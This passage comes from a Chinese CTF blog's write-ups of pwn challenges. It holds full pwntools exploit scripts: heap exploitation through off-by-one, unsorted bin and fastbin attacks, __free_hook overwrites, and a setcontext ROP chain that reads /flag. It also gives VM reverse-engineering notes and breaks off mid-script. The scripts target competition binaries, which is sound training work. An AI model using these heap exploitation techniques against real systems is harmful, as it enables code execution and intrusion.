class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"LIBCADDR"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">"\x00"</span>)) + <span class="number">0x36</span> - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">-1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">15</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(__free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">11</span>, <span class="string">'/bin/sh\x00'</span> + <span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(libc_system) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="block"><a href="#block" class="headerlink" title="block"></a>block</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li><p>这个<code>2333</code>号功能貌似是迷惑性质的？这个随机数没法拿到，直接放弃这个功能了；另外那个<code>gas</code>基本上不可能超过，足够用了，所以可以不用管。</p></li><li><p>binary存在一次<code>add</code>给size或了一个1，所以提供了off by one的机会。</p></li><li><p>但是<code>edit</code>功能和<code>show</code>功能只能使用一次，所以这里先通过off by one（一次<code>edit</code>）构造chunk overlap，伪造unsorted bin把两个fastbin给overlap（从低到高地址分别为inuse和free的状态）。</p></li><li><p>然后从分配空间切割unsorted bin使其和第一个fastbin重合（并且size被覆盖为切割剩下的chunk的size，也就是比原先的fastbin大0x10大小）。</p></li><li><p>此时在释放一个chunk到unsorted bin中，使得unsorted bin中存在两个chunk，再通过inuse的fastbin来leak出libc和heap（一次<code>show</code>）。</p></li><li><p>释放这个inuse的fastbin，然后重新<code>malloc</code>拿到，同时修改<code>unsorted bin-&gt;bk</code>为<code>__free_hook - 0x20</code>以及下一个free的<code>fastbin-&gt;fd = __free_hook - 0x13</code>（保持<code>unsorted bin-&gt;fd</code>和<code>fastbin-&gt;size</code>不变）。</p></li><li><p>然后分配切割剩下的unsorted bin（大小一致，否则会crash），触发unsorted bin attack在<code>__free_hook - 0x10</code>的位置留下libc的地址，再利用这个libc地址的<code>0x7f</code>为size进行fastbin attack得到<code>__free_hook</code>。</p></li><li><p>因为此时unsorted bin被破坏了，fastbin里是空的，所以不能再分配空间，只能在已有chunk的基础上构造rop进行orw（<code>execve</code>被ban了），即在chunk间利用<code>pop rsp</code>进行横跳（chunk正好够用，运气很好）；布置好rop同时改<code>__free_hook</code>为<code>setcontext + 53</code>，之后触发rop即可。</p></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'122.112.204.227'</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(types, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's type: "</span>, str(types))</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"The Block's content: "</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's index: "</span>, str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"The content is "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice &gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"The Block's index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"The Block's new content: "</span>, content)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">setcontext_offset = libc.sym[<span class="string">'setcontext'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x500</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"AAAA\n"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB\n"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>) <span class="comment"># chunk 4</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x68</span> + <span class="string">'\x81'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB\n"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0xdf0</span></span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_setcontext = libc_base + setcontext_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">pop_rsp = libc_base + <span class="number">0x0000000000003960</span> <span class="comment"># pop rsp ; ret</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x0000000000043a78</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000023e8a</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b96</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">pop_pop_pop_ret = libc_base + <span class="number">0x0000000000023e85</span> <span class="comment"># pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d29d5</span><span class="comment"># syscall; ret; </span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000008aa</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># fastbin</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># fastbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, p64(libc_base + <span class="number">0x637d10</span>) + p64(__free_hook - <span class="number">0x20</span>) + <span class="string">'\n'</span>) <span class="comment"># chunk0</span></span><br><span class="line"></span><br><span class="line">payload = flat([pop_rax, <span class="number">2</span>, pop_rdi, __free_hook + <span class="number">0x50</span>, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0x0</span>, syscall])</span><br><span class="line">payload += flat([pop_rax, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsp, heap_base + <span class="number">0x18F0</span>]) <span class="comment"># change rsp</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, payload.ljust(<span class="number">0x68</span>, <span class="string">"B"</span>) + p64(<span class="number">0x71</span>) + p64(__free_hook - <span class="number">0x13</span>)) <span class="comment"># unsorted bin attack (chunk 3 ==&gt; to be freed)</span></span><br><span class="line"></span><br><span class="line">payload = flat([pop_rdi, <span class="number">3</span>, pop_rsi, heap_base, pop_pop_pop_ret]) + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += flat([heap_base + <span class="number">0x1880</span>, ret])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([syscall])</span><br><span class="line">payload += flat([pop_rsp, __free_hook + <span class="number">0x8</span>])</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([pop_rax, <span class="number">1</span>, pop_rdi, <span class="number">1</span>, pop_rsi, heap_base, pop_rdx, <span class="number">0x40</span>, syscall])</span><br><span class="line">payload += <span class="string">"/flag\x00"</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"A"</span> * <span class="number">0x3</span> + p64(libc_setcontext + <span class="number">53</span>) + payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="veryeasy"><a href="#veryeasy" class="headerlink" title="veryeasy"></a>veryeasy</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目不是我做的，但是简单看了下，比较简单，就是个fastbin double free，以及无leak的情况下打stdout进行leak的利用方式。</p><h2 id="fsplayground"><a href="#fsplayground" class="headerlink" title="fsplayground"></a>fsplayground</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>这题是公司的学长做的，不过我也一下没反应过来怎么做，因为就是一个任意读写文件的功能，开始只想到了读<code>/proc/self/maps</code>可以读加载地址；后来学长说可以通过写<code>/proc/self/memory</code>直接改加载在内存里的binary，然后直接把<code>flag</code>那个字符串给改了，然后check的逻辑就废了，就能直接读flag了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实习的倒数第二天在公司打的最后一场比赛了，贡献一点小小的力量，最后进前十了还是很开心的。但是只搞了两个pwn，剩下的babyrpc没有仔细看，vmpwn卡住了，就暂且写一下剩下部分的wp吧，其他的看看后面能不能搜到wp。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>强网杯线上赛部分pwn</title>
    <link href="https://n0nop.github.io/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/"/>
    <id>https://n0nop.github.io/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/</id>
    <published>2020-08-26T06:26:49.000Z</published>
    <updated>2020-08-28T16:06:45.575Z</updated>
    
    <content type="html"><![CDATA[<p>pwn比赛，但是太弱了只能做简单的题，难题只能赛后学习别人的wp了；最后跟着队里打进了前十，大哥们太猛了！就简单记录一下自己做得题好了，本来是想着复现一些题的，但是时间上目前比较吃紧，以后有时间再看吧（咕咕咕）。</p><a id="more"></a><h1 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h1><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>vm pwn，分析一下binary：</p><p> 初始化的过程如下：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">v9 = (struc_pcb *)<span class="built_in">calloc</span>(<span class="number">0xD0</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  v9-&gt;code_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, ((*(_QWORD *)(v8 + <span class="number">14</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>);<span class="comment">// v8 + 6   ===&gt;    code data start</span></span><br><span class="line">  <span class="built_in">memcpy</span>(v9-&gt;code_buf, &amp;v8[*(_QWORD *)(v8 + <span class="number">6</span>)], *(_QWORD *)(v8 + <span class="number">14</span>));<span class="comment">// v8 + 14   ===&gt;   code length</span></span><br><span class="line">  v9-&gt;code_size = ((*(_QWORD *)(v8 + <span class="number">14</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>;<span class="comment">// store code data size</span></span><br><span class="line">  v9-&gt;global_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, ((*(_QWORD *)(v8 + <span class="number">30</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>);<span class="comment">// v8 + 30   ===&gt;   global data size</span></span><br><span class="line">  <span class="built_in">memcpy</span>(v9-&gt;global_buf, &amp;v8[*(_QWORD *)(v8 + <span class="number">22</span>)], *(_QWORD *)(v8 + <span class="number">30</span>));<span class="comment">// v8 + 22   ===&gt;    global data start</span></span><br><span class="line">  v9-&gt;global_size = ((*(_QWORD *)(v8 + <span class="number">30</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>;<span class="comment">// store global data size</span></span><br><span class="line">  v9-&gt;stack_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x20000</span>uLL);     <span class="comment">// stack</span></span><br><span class="line">  v9-&gt;stack_size = <span class="number">0x20000</span>LL;</span><br><span class="line">  v9-&gt;_rsp = <span class="number">0x10000</span>LL;</span><br><span class="line">  v9-&gt;_rip = *(_QWORD *)(v8 + <span class="number">38</span>);              <span class="comment">// v8 + 38   ===&gt;   pc start</span></span><br><span class="line">  IO_FILE = (__int64)<span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(IO_FILE + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)IO_FILE = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(IO_FILE + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v3 = IO_FILE;</span><br><span class="line">  *(_QWORD *)(v3 + <span class="number">16</span>) = <span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  **(_DWORD **)(IO_FILE + <span class="number">16</span>) = <span class="number">1</span>;</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">8L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  v4 = *(_QWORD *)(IO_FILE + <span class="number">16</span>);</span><br><span class="line">  *(_QWORD *)(v4 + <span class="number">16</span>) = <span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) + <span class="number">16L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  **(_DWORD **)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) = <span class="number">2</span>;</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) + <span class="number">8L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)vmstart(v9) )</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p> 传入的<code>v9</code>为自定义的结构体，为了方便分析：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> struc_pcb       struc ; (<span class="keyword">sizeof</span>=<span class="number">0xD8</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span> REG             dq <span class="number">16</span> dup(?)</span><br><span class="line"><span class="number">00000080</span> _rsp            dq ?</span><br><span class="line"><span class="number">00000088</span> field_88        dq ?</span><br><span class="line"><span class="number">00000090</span> _rip            dq ?</span><br><span class="line"><span class="number">00000098</span> rflag           dq ?</span><br><span class="line"><span class="number">000000</span>A0 code_size       dq ?</span><br><span class="line"><span class="number">000000</span>A8 code_buf        dq ?                    ; offset</span><br><span class="line"><span class="number">000000B</span>0 global_size     dq ?</span><br><span class="line"><span class="number">000000B</span>8 global_buf      dq ?                    ; offset</span><br><span class="line"><span class="number">000000</span>C0 stack_size      dq ?</span><br><span class="line"><span class="number">000000</span>C8 stack_buf       dq ?                    ; offset</span><br><span class="line"><span class="number">000000</span>D0 field_D0        dq ?</span><br><span class="line"><span class="number">000000</span>D8 struc_pcb       ends</span><br></pre></td></tr></table></figure><p> 基本上<code>test.bin</code>里面，<code>0x100 - 0x8B8</code>的位置就是<code>code segment</code>，<code>0x8B8 - 0x978</code>就是<code>bss segment</code>，栈是通过<code>calloc(1uLL, 0x20000uLL)</code>另外开辟的，栈底就是<code>0x20000</code>。</p><p> 指令部分简单贴一下当时做题的分析结果（有些指令逻辑是相同的，但是不影响）：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[0]  [1]  [2]  [3]</span><br><span class="line">   0000 0000 0000 0000</span><br><span class="line">   [3] &#x3D;&#x3D;&gt; opcode            ins_len </span><br><span class="line">   0x1, 2, 3, 4      0xB</span><br><span class="line">   0x0, B, C, D, E   0x4</span><br><span class="line">   0x5               [2] &#x3D;&#x3D; 0x1: 0x4</span><br><span class="line">     [2] &#x3D;&#x3D; 0x2: 0x5</span><br><span class="line">     [2] &#x3D;&#x3D; 0x3: 0x7</span><br><span class="line">     [2] &#x3D;&#x3D; 0x4: 0xB</span><br><span class="line">   0x6   0x3</span><br><span class="line">   0x7  [2] &#x3D;&#x3D; 0x1: 0x3</span><br><span class="line">     [2] &#x3D;&#x3D; 0x2: 0x4</span><br><span class="line">     [2] &#x3D;&#x3D; 0x3: 0x6</span><br><span class="line">     [2] &#x3D;&#x3D; 0x4: 0xA</span><br><span class="line">   0x8  [1] &#x3D;&#x3D; 0x2: 0x2</span><br><span class="line">     else: 0xA</span><br><span class="line">   0x9  [1] &#x3D;&#x3D; 0x2: 0x2</span><br><span class="line">     _rip &gt;&#x3D; size-10: 0x2</span><br><span class="line">   </span><br><span class="line">    rflag:</span><br><span class="line">    8  &lt; (unsigned)</span><br><span class="line">    1  overflow</span><br><span class="line">    4  zero</span><br><span class="line">    2  res is negative (signed)</span><br><span class="line">    </span><br><span class="line">    1：mov指令</span><br><span class="line">    2：add</span><br><span class="line">    3：sub</span><br><span class="line">    4：mul</span><br><span class="line">    5：mul</span><br><span class="line">    6：mod</span><br><span class="line">    7：xor</span><br><span class="line">    8：or</span><br><span class="line">    9：and</span><br><span class="line">    A：shl</span><br><span class="line">    B：shr</span><br><span class="line">    C：not</span><br><span class="line">    D：pop</span><br><span class="line">    E：push</span><br><span class="line">    10：call</span><br><span class="line">    11：ret</span><br><span class="line">    12：cmp</span><br><span class="line">    13：jmp</span><br><span class="line">    14：jz</span><br><span class="line">    15：jnz</span><br><span class="line">    16：jg</span><br><span class="line">    17：jg</span><br><span class="line">    18：jle</span><br><span class="line">    19：jge</span><br><span class="line">    1A：ja</span><br><span class="line">    1B：ja</span><br><span class="line">    1C：jae</span><br><span class="line">    1D：jae</span><br><span class="line">    0x20：syscall</span><br><span class="line">    </span><br><span class="line">    for 0x20:</span><br><span class="line">    20 xx  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 3,  args: r1              close</span><br><span class="line">    20 08  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 1,  args: r1, r2, r3      read to virtual bss</span><br><span class="line">     r0 &#x3D;&#x3D; 2,  args: r1, r2, r3      write from virtual bss</span><br><span class="line">    20 09  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 1,  args: r1, r2, r3      read to virtual stack</span><br><span class="line">     r0 &#x3D;&#x3D; 2,  args: r1, r2, r3      write from virtual stack</span><br><span class="line">    20 10  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 0,  args: r1, r2          open</span><br></pre></td></tr></table></figure></li><li><p>由于本身是个pwn题，如果用我的龟速去写个脚本翻译指令就太慢了，索性就直接颅内翻译+动态调试验证，其实逻辑也十分简单。</p></li><li><p>首先<code>test.bin</code>是通过<code>call</code>指令进入主函数，然后要求输入<code>password</code>然后进行<code>check</code>前<code>3</code>个字符是单独比较的，后面<code>32</code>个字符分成四组异或后再比较，基本遵从如下格式（<code>test.bin</code>里<code>0x22E</code>的位置）：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01 15 00 01   &#x3D;&#x3D;&#x3D;&gt;   movb r0, 1</span><br><span class="line">01 25 01 00 00    &#x3D;&#x3D;&#x3D;&gt;   movw r1, 1</span><br><span class="line">01 25 02 40 00    &#x3D;&#x3D;&#x3D;&gt;   movw r2, 0x40</span><br><span class="line">01 15 03 21   &#x3D;&#x3D;&#x3D;&gt;   movb r3, 0x21</span><br><span class="line">20 08    &#x3D;&#x3D;&#x3D;&gt;   read</span><br><span class="line">07 40 08 08    &#x3D;&#x3D;&#x3D;&gt;   xor r8, r8  </span><br><span class="line">01 41 08 40 00 00 00 00 00 00 00    &#x3D;&#x3D;&#x3D;&gt;   movq r8, 0x40</span><br><span class="line">01 45 09 CD AB 27 98 12 34 72 42    &#x3D;&#x3D;&#x3D;&gt;   movq r9, 0x427234129827ABCD</span><br><span class="line">07 40 08 09   &#x3D;&#x3D;&#x3D;&gt;   xor r8, r9</span><br><span class="line">12 45 08 8A 9B 17 DC 40 07 24 10    &#x3D;&#x3D;&#x3D;&gt;   cmp r8, 0x10240740DC179B8A</span><br><span class="line">14 17 02   &#x3D;&#x3D;&#x3D;&gt;   jz 2</span><br><span class="line">00 0A   &#x3D;&#x3D;&#x3D;&gt;   exit</span><br></pre></td></tr></table></figure><p> 那么简单写个逆推脚本：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">"QWQ"</span></span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0xCD</span>, <span class="number">0xAB</span>, <span class="number">0x27</span>, <span class="number">0x98</span>, <span 